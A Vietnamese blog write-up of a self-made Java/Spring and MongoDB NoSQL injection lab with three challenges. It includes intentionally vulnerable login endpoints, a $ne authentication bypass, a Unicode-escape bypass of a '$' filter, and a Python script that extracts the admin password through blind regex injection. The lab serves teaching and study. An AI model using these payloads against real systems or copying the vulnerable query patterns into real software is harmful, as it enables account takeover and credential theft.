---
title: NoSQL Injection Vulnerability Challenge Java
categories: [pentesting, Web-Exploitation]
tags: [Web]
---

# NoSQL Injection Vulnerability Challenge Java

### Tổng quan về NoSQL Injection

- Tấn công NoSQL injection là một lỗ hổng bảo mật trong các ứng dụng web sử dụng cơ sở dữ liệu NoSQL. NoSQL (viết tắt của "Not Only SQL") là các hệ thống cơ sở dữ liệu không sử dụng ngôn ngữ truy vấn có cấu trúc SQL, mà thay vào đó dùng các định dạng dữ liệu linh hoạt hơn như cặp khóa-giá trị, tài liệu (document), hoặc đồ thị dữ liệu.

- Tương tự như SQL injection, NoSQL injection cho phép kẻ tấn công vượt qua xác thực, đánh cắp dữ liệu nhạy cảm, thay đổi dữ liệu trong cơ sở dữ liệu, hoặc thậm chí chiếm quyền kiểm soát cơ sở dữ liệu và máy chủ bên dưới. Phần lớn các lỗ hổng NoSQL injection xuất hiện do lập trình viên xử lý dữ liệu đầu vào từ người dùng mà không thực hiện kiểm tra hoặc làm sạch dữ liệu đúng cách.

- Do NoSQL không có một ngôn ngữ truy vấn chuẩn hóa duy nhất, các loại truy vấn được phép sẽ phụ thuộc vào:

- Công cụ cơ sở dữ liệu — ví dụ: MongoDB, Cassandra, Redis, hoặc Google Bigtable

- Ngôn ngữ lập trình — ví dụ: Python, PHP

- Framework phát triển — ví dụ: Angular, Node.js

- Một điểm chung của hầu hết các cơ sở dữ liệu NoSQL là chúng hỗ trợ định dạng JSON (JavaScript Object Notation) dạng văn bản, và thường cho phép người dùng gửi dữ liệu đầu vào dưới dạng tệp JSON. Nếu dữ liệu này không được kiểm tra và làm sạch, nó có thể trở thành mục tiêu của các cuộc tấn công injection.

### Source Code

[Github](https://github.com/pzhat/NoSQL_Injection_Lab)

### Tổng quan challenge

![image](https://hackmd.io/_uploads/ByVL62gplx.png)

Lab sẽ bao gồm 3 challenge tương ứng với 3 độ khó khác nhau:

- Challenge 1 : No Filter
- Challenge 2: Filter biến '$'
- Challenge 3: Làm thông báo không trả về (Blind NoSQL).

Ở đây mình làm một chall đơn giản với chức năng chính là đăng nhập.

```java 
String adminPassword = "SuperSecretPassword_" + UUID.randomUUID();
```

Ở đây Admin password sẽ được tự động gen ra random.

```java 
userRepository.save(new User("admin", adminPassword));
userRepository.save(new User("user", "password123"));
```

![image](https://hackmd.io/_uploads/BJIeepgale.png)


Ở đây mình khởi tạo 2 user chính là `user` và `admin`.

Phần xử lý logic chính của challenge sẽ nằm trong `AuthController.java` nó sẽ xử lý đầy đủ logic của 3 challenges.

### Khai thác và POC

#### Challenge 1:

Đến với chall đầu tiên này thì nó đơn giản là không có lớp filter nào ở đoạn NoSQl truy vẫn đến database.

```java 
//AuthController
@PostMapping("/api/challenge1/login")
    @ResponseBody
    public ResponseEntity<String> challenge1(@RequestBody JsonNode payload) {
        try {
            String username = payload.get("username").asText();
            Object password = objectMapper.convertValue(payload.get("password"), Object.class);
            return performLogin(username, password);
        } catch (Exception e) {
            return ResponseEntity.status(400).body("JSON payload không hợp lệ.");
        }
    }
```

```java 
//UserRespository
public interface UserRepository extends MongoRepository<User, String> {

    @Query("{'username': ?0, 'password': ?1}")
    Optional<User> findUserByLogin(String username, Object password);
}
```

Đây là kịch bản cơ bản nhất. Backend nhận username (dạng chuỗi) và password (dạng Object). Việc chấp nhận một Object cho trường mật khẩu là lỗ hổng chí mạng, vì nó cho phép chúng ta thay thế một giá trị chuỗi đơn giản bằng một đối tượng toán tử truy vấn của MongoDB.

![image](https://hackmd.io/_uploads/r1vVZTlpxe.png)

Ở đây tôi thử đăng nhập bằng mật khẩu lung tung thì được trả về 401 bây giờ ta sẽ thử với mật khẩu được generate ra xem có đăng nhập được không.

![image](https://hackmd.io/_uploads/rJBOWTealx.png)

Với password được gen ra thì hoàn toàn có thể truy cập với user admin. Vậy trong trường hợp ta không biết mật khẩu thì ta có thể khai thác NoSQL này như thế nào.

Ở đây với challenge 1 là không có filter vậy ta sẽ sử dụng payload đơn giản là lợi dụng operator logic để khai thác ở đây mình sử dụng `$ne` có nghĩa là `not equals`.

![image](https://hackmd.io/_uploads/ryYhragaee.png)

Giải thích Payload
- Bình thường, câu truy vấn sẽ là: `db.users.find({username: "admin", password: "your_input"})`
- Khi bạn gửi payload trên, câu truy vấn thực tế trên server sẽ trở thành: `db.users.find({username: "admin", password: { $ne: null }})`
- Câu lệnh này có nghĩa là: "Hãy tìm một người dùng có username là admin và có trường password không phải là null (tức là có tồn tại mật khẩu)".
- Vì tài khoản admin của chúng ta chắc chắn có mật khẩu, điều kiện này sẽ đúng và đăng nhập thành công.

Vậy là ta đã thành công lợi dụng logic để có thể đăng nhập vào tài khoản admin mà không cần password.

#### Challenge 2:

![image](https://hackmd.io/_uploads/rJUuvCeael.png)

```java 
    @PostMapping("/api/challenge2/login")
    @ResponseBody
    public ResponseEntity<String> challenge2(HttpServletRequest request) { // Nhận vào HttpServletRequest
        try {
            String rawPayload = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);

            if (rawPayload.contains("$")) {
                return ResponseEntity.status(400).body("Payload chứa ký tự không hợp lệ ($)!");
            }
            
            JsonNode node = objectMapper.readTree(rawPayload);
            String username = node.get("username").asText();
            Object password = objectMapper.convertValue(node.get("password"), Object.class);
            return performLogin(username, password);

        } catch (IOException e) {
            return ResponseEntity.status(500).body("Lỗi hệ thống khi đọc request.");
        } catch (Exception e) {
            return ResponseEntity.status(400).body("JSON không hợp lệ.");
        }
    }
```

Đến với level 2 ta để ý rằng có dòng:

```java 
if (rawPayload.contains("$")) {
    return ResponseEntity.status(400).body("Payload chứa ký tự không hợp lệ ($)!");
            }
```

Đoạn code này đã chặn đi dấu `$` mà ta sử dụng hầu như trong tất cả cách payload.

![image](https://hackmd.io/_uploads/ByRDORgTgg.png)

Nhưng nếu như ta để ý kĩ phần xử lý http request của challenge 2 thì ta có thể thấy rằng dev đã vô tình chỉ xử lý dữ liệu theo kiểu thô `String rawPayload = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);` và không hề có bước check rằng nếu user nhập dưới dạng encode các loại thì có bị block hay không nên đây có thể là đường khai thác cho ta ở challenge này.

Ở đây vì nó nhận raw request nên ta hoàn toàn có thể sử dụng cách đó là lợi dụng `Unicode Escape` để biến giá trị `$` thành `\u0024`.

Bây giờ với cách như vậy ta sẽ thử payload xem sao.

![image](https://hackmd.io/_uploads/SJKIK0e6lx.png)

Vậy là ta đã thành công bypass lớp filter ở level 2 bằng unicode escape.

#### Challenge 3 (Blind NoSQLi):

Đến với challenge thứ 3 này ta có đoạn xử lý logic như sau:

```java 
   @PostMapping("/api/challenge3/login")
    @ResponseBody
    public ResponseEntity<String> challenge3(@RequestBody JsonNode payload) {
        try {
            String username = payload.get("username").asText();
            String passwordRegex = payload.get("password").asText();
            String anchoredRegex = "^" + passwordRegex + "$";

            Query query = new Query();
            query.addCriteria(Criteria.where("username").is(username)
                    .and("password").regex(anchoredRegex)); // Dùng regex đã được neo

            List<User> users = mongoTemplate.find(query, User.class);

            if (!users.isEmpty()) {
                return ResponseEntity.ok("Đăng nhập thành công.");
            } else {
                return ResponseEntity.status(401).body("Đăng nhập thất bại.");
            }
        } catch (Exception e) {
            return ResponseEntity.status(400).body("Payload không hợp lệ (password phải là string).");
        }
    }

    private ResponseEntity<String> performLogin(String username, Object password) {
        Optional<User> user = userRepository.findUserByLogin(username, password);
        if (user.isPresent()) {
            return ResponseEntity.ok("Đăng nhập thành công với tài khoản: " + user.get().getUsername());
        }
        return ResponseEntity.status(401).body("Sai tên đăng nhập hoặc mật khẩu.");
    }
```

Ở đây có các lớp phòng thủ là:

```java 
String username = payload.get("username").asText();
String passwordRegex = payload.get("password").asText();
```

Nó sẽ ép kiểu password thành dạng string và các payload kiểu object sẽ bị block đi nên là các payload cũ sẽ không còn khả thi cho challenge này.

Tiếp theo là:

```java 
String anchoredRegex = "^" + passwordRegex + "$";
```

- Chúng ta lấy chuỗi regex mà người dùng gửi (passwordRegex) và tự động ghép thêm hai ký tự đặc biệt vào:
- ^: Ký tự neo (anchor), có nghĩa là "khớp từ đầu chuỗi".
- $: Ký tự neo (anchor), có nghĩa là "khớp đến cuối chuỗi".
Tác dụng:
- Nếu người dùng gửi payload đơn giản là S, chuỗi regex cuối cùng sẽ là ^S$. Câu lệnh này có nghĩa là: "Tìm một mật khẩu bắt đầu bằng 'S' và kết thúc ngay sau đó" (tức là mật khẩu chỉ có đúng một ký tự là 'S'). Điều này sẽ thất bại.
- Nó ngăn chặn hoàn toàn các kiểu tấn công "chứa" (contains) mà chúng ta đã gặp ở phiên bản lỗi trước.
- Nó bắt buộc attacker phải xây dựng một regex phức tạp hơn, có thể khớp với toàn bộ mật khẩu, nếu muốn nhận được phản hồi "thành công".

```java 
Query query = new Query();
query.addCriteria(Criteria.where("username").is(username)
                          .and("password").regex(anchoredRegex));
List<User> users = mongoTemplate.find(query, User.class);
```

- MongoTemplate là một công cụ của Spring giúp xây dựng các câu truy vấn MongoDB một cách linh hoạt.
- Lệnh Criteria.where("password").regex(anchoredRegex) chính là nơi lỗ hổng tồn tại. Nó nói với MongoDB: "Hãy tìm trong trường password, những document nào khớp với biểu thức chính quy chứa trong biến anchoredRegex".

Với các phân tích về code của challenge 3 trên thì ta có kịch bản tấn công là lợi dụng regex để khai thác NoSQL. Vì ở đây developer tuy đã sử dụng regex để phòng thủ nhưng lại không chú ý đến việc escape các regex mà người dùng có thể nhập vào bên trong dẫn đến attacker có thể lợi dụng chính các regex đó để tạo ra payload. Kỹ thuật này gọi là Regex Injection.

![image](https://hackmd.io/_uploads/B1LQ0kZaex.png)

Thử với payload ở level trước nhưng nhận được 401 bây giờ ta sẽ tiến hành thử với regex injection.

Trước hết ta sẽ thử xài regex để dò độ dài của password.

![image](https://hackmd.io/_uploads/By61glbTel.png)

Với độ dài là 30 thì ta nhận kết quả trả về ở đây ta cho nó là false tại đây ta có thể sử dụng burp intruder để xác định được độ dài của chuỗi password.

![image](https://hackmd.io/_uploads/ry7Oeeb6gx.png)

Ta sẽ test thử từ 1 đến 100 xem sao.

![image](https://hackmd.io/_uploads/ByqjggWpee.png)

Với số 56 ta nhận về được response 200 duy nhất nên có thể xác định password có 56 kí tự.

Từ đây ta sẽ tiến hành tìm từng kí tự của password với giới hạn là 56 kí tự.

![image](https://hackmd.io/_uploads/ByMf-xb6xe.png)

Với regex `A.{55}` này thì nó có nghĩa là kí tự đầu sẽ là A và 55 kí tự còn lại là bất cứ thứ gì nhưng có vẻ với kí tự đầu tiên là A đã sai vì server trả về response là 401.

![image](https://hackmd.io/_uploads/r1eDWeWTgx.png)

Tiến hành thử với chữ S thì ta đã thành công trong việc dump ra được kí tự đầu tiên của password vì server đã trả về response là 200 cho payload `S.{55}`.

Nếu test tay với password có độ dài khủng như này thì sẽ rất là mất thời gian dò nên ta hoàn toàn có thể lợi dụng python script để có thể dump password một cách nhanh chóng.

```python 
import requests
import string

url = "http://localhost:8080/api/challenge3/login"
password_length = 56 
known_password = ""
charset = string.ascii_letters + string.digits + "_-" # Bộ ký tự để đoán

# Vòng lặp để tìm từng ký tự của mật khẩu
for i in range(password_length):
    # Vòng lặp để thử từng ký tự trong bộ ký tự
    for char in charset:
        guess = known_password + char
        
        payload_regex = guess + ".*"
        
        json_data = {"username": "admin", "password": payload_regex}
        response = requests.post(url, json=json_data)
        
        if response.status_code == 200:
            known_password = guess
            print(f"Tìm thấy ký tự tiếp theo: {known_password}")
            break 
            
print(f"\nKhai thác hoàn tất! Mật khẩu là: {known_password}")
```

![image](https://hackmd.io/_uploads/Bkl5zg-6ee.png)

Thành công dump ra password bây giờ ta sẽ thử đăng nhập xem liệu password này có đúng hay không.

![image](https://hackmd.io/_uploads/HyZ6MgZaee.png)

Đăng nhập thành công với password trên vậy nên ta đã khai thác thành công Blind NoSQLi bằng kĩ thuật Regex Injection.

